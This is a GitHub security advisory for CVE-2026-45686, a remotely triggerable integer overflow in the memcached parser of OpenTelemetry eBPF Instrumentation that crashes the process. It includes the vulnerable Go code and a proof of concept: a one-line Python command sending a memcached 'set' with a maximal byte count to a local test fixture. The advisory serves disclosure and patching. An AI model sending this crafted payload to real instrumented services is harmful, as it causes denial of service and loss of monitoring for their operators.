# [H] OpenTelemetry eBPF Instrumentation: Memcached payload length overflow can crash OBI

## Summary
Severity: High
Advisory: GHSA-43g7-cwr8-q3jh
CVE: CVE-2026-45686
CWE: CWE-190
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-43g7-cwr8-q3jh
Type: github-advisory

## Affected
- Go: `go.opentelemetry.io/obi` — affected >=0.7.0 <0.9.0

## Details
### Summary

A remotely reachable integer overflow in OBI's memcached text protocol parser can crash the OBI process and cause denial of service. When parsing memcached storage commands such as `set`, `add`, `replace`, `append`, `prepend`, or `cas`, OBI accepts extremely large `<bytes>` values and adds the payload delimiter length without checking for overflow. A crafted request with `<bytes>` set to `math.MaxInt` or `math.MaxInt-1` causes the computed payload length to wrap negative and triggers a runtime panic in `LargeBufferReader.Peek`.

### Details

The issue is in the memcached request parser at `pkg/ebpf/common/memcached_detect_transform.go`.

`memcachedCommandBytesField` parses the storage command `<bytes>` field with `strconv.Atoi` and only rejects negative values:

```go
size, err := strconv.Atoi(string(fields[4]))
if err != nil || size < 0 {
	return 0, false
}
```

Because there is no upper bound check, values up to `math.MaxInt` are accepted.

`memcachedConsumeStoragePayload` then computes the payload length by adding the trailing `\r\n` delimiter length:

```go
payloadLen := bytesField + len(memcachedDelimBytes)
payload, err := r.Peek(payloadLen)
```

If `bytesField` is `math.MaxInt` or `math.MaxInt-1`, this addition overflows the signed `int` and produces a negative `payloadLen`.

That negative length is passed into `LargeBufferReader.Peek` in `pkg/internal/largebuf/large_buffer.go`. `Peek` checks whether `n > Remaining()` but does not reject negative values before slicing:

```go
if r.rchunk < len(r.lb.chunks) && r.roff+n <= len(r.lb.chunks[r.rchunk]) {
	return r.lb.chunks[r.rchunk][r.roff : r.roff+n], nil
}
```

With a negative `n`, the slice expression uses a negative upper bound and causes a Go runtime panic. Since OBI runs as a privileged instrumentation process and parses observed memcached traffic, an attacker who can send crafted memcached storage commands to an instrumented service can crash OBI remotely.

Affected logic identified by the scan:

- `pkg/ebpf/common/memcached_detect_transform.go:322`
- `pkg/ebpf/common/memcached_detect_transform.go:386`
- `pkg/internal/largebuf/large_buffer.go:501`

### PoC

The repository already contains a runnable memcached fixture under `internal/test/oats/memcached/`. The steps below reproduce the crash using only files from this repository.

1. From the repository root, start the checked-in memcached environment:

   ```bash
   docker compose \
     -f internal/test/oats/memcached/docker-compose-include-base.yml \
     -f internal/test/oats/memcached/docker-compose-obi-python-memcached.yml \
     up --build
   ```

   This starts:

   - `memcached` on port `11211`
   - `testserver`, the Python app in `internal/test/integration/components/pythonmemcached/main.py`
   - `autoinstrumenter`, the OBI process launched with `--config=/configs/instrumenter-config-traces.yml`

   The relevant repo-local files are:

   - `internal/test/oats/memcached/docker-compose-obi-python-memcached.yml`
   - `internal/test/oats/memcached/configs/instrumenter-config-traces.yml`

2. In a second shell, confirm the environment is working:

   ```bash
   curl http://127.0.0.1:8080/memcached
   ```

3. From the same repository root, send a crafted memcached storage command from inside the instrumented `testserver` container. On 64-bit systems, use `9223372036854775807` (`math.MaxInt`):

   ```bash
   docker compose \
     -f internal/test/oats/memcached/docker-compose-include-base.yml \
     -f internal/test/oats/memcached/docker-compose-obi-python-memcached.yml \
     exec testserver \
     python -c 'import socket; s=socket.create_connection(("memcached",11211), timeout=5); s.sendall(b"set crash 0 0 9223372036854775807\r\nvalue\r\n"); s.close()'
   ```

   On 32-bit systems, replace `9223372036854775807` with `2147483647`.

4. OBI parses the request header, accepts the `<bytes>` field as an `int`, and computes:

   ```go
   payloadLen = bytesField + len("\r\n")
   ```

5. That addition overflows negative and the negative `payloadLen` is passed to `LargeBufferReader.Peek`, which slices with an invalid bound and panics.

6. Confirm the crash by checking the `autoinstrumenter` container status or logs:

   ```bash
   docker compose \
     -f internal/test/oats/memcached/docker-compose-include-base.yml \
     -f internal/test/oats/memcached/docker-compose-obi-python-memcached.yml \
     ps autoinstrumenter
   ```

   ```bash
   docker compose \
     -f internal/test/oats/memcached/docker-compose-include-base.yml \
     -f internal/test/oats/memcached/docker-compose-obi-python-memcached.yml \
     logs autoinstrumenter
   ```

   The expected result is that the OBI process crashes with a panic originating from `LargeBufferReader.Peek`, with the call path including `memcachedConsumeStoragePayload`.

### Impact

This is a remote denial-of-service vulnerability in OBI's memcached protocol parsing path.

Impacted deployments are those where:

- OBI is running with the vulnerable memcached parser, and
- OBI observes memcached text protocol traffic from applications or services that an attacker can reach or influence.

A successful attack does not require code execution or authentication against OBI itself. An attacker only needs to cause a vulnerable instrumented service to emit or receive a crafted memcached storage command. The result is a panic in OBI and loss of telemetry collection until the process is restarted.

## References
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/security/advisories/GHSA-43g7-cwr8-q3jh
- https://nvd.nist.gov/vuln/detail/CVE-2026-45686
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation
- https://github.com/open-telemetry/opentelemetry-ebpf-instrumentation/releases/tag/v0.9.0
